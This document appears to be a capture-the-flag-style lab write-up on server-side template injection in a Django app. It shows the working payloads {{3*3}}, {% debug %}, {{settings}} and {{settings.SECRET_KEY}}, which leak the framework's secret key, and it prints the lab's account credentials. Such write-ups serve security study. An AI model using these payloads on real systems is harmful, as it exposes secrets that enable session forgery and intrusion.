# Server-Side Template Injection — Information Disclosure via User-Supplied Objects

This lab is exploitable through server-side template injection, caused by how an object gets passed into the template. The flaw can be leveraged to access sensitive data.

**Goal:** Steal and submit the framework's secret key.

Login credentials for your own account: content-manager:C0nt3ntM4n4g3r

---

**Reference:**
- https://portswigger.net/web-security/server-side-template-injection/exploiting

<img width="760" height="247" alt="1" src="https://github.com/user-attachments/assets/fd938563-0901-446e-a8ec-febd306c698c" />


---

The post templates can be edited directly:

<img width="785" height="202" alt="2" src="https://github.com/user-attachments/assets/1f4418f9-734b-4ab8-9412-6a3fdb996d07" />


Values calculated in the format `${product.X}` show up on the page:

<img width="1152" height="384" alt="3" src="https://github.com/user-attachments/assets/91b09207-5f6e-4f7c-80cc-032f589fac0c" />


Submitting the payload `{{3*3}}` produces the following stack trace:

<img width="776" height="177" alt="4" src="https://github.com/user-attachments/assets/567335ce-69ed-4ebe-a46e-53fa99c08458" />


```
Traceback (most recent call last):  File "<string>", line 11, in <module>  File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 191, in __init__    self.nodelist = self.compile_nodelist()  File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 230, in compile_nodelist    return parser.parse()  File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 486, in parse    raise self.error(token, e)django.template.exceptions.TemplateSyntaxError: Could not parse the remainder: '*3' from '3*3'
```

This confirms a Django template engine is in use, so debug info can be leaked with:

```
{% debug %}
```

<img width="770" height="222" alt="5" src="https://github.com/user-attachments/assets/db25618c-fe17-4afe-9f62-d033908a8648" />


Django exposes a `settings` object of type `UserSettingsHolder`:

```
{{settings}}
```

<img width="771" height="531" alt="6" src="https://github.com/user-attachments/assets/d8c85bab-2167-407c-aca9-74744293e4a2" />


That object includes a `SECRET_KEY` field:

```
{{settings.SECRET_KEY}}
```

<img width="768" height="538" alt="7" src="https://github.com/user-attachments/assets/753122f0-923d-4333-ae38-97de24e8945f" />

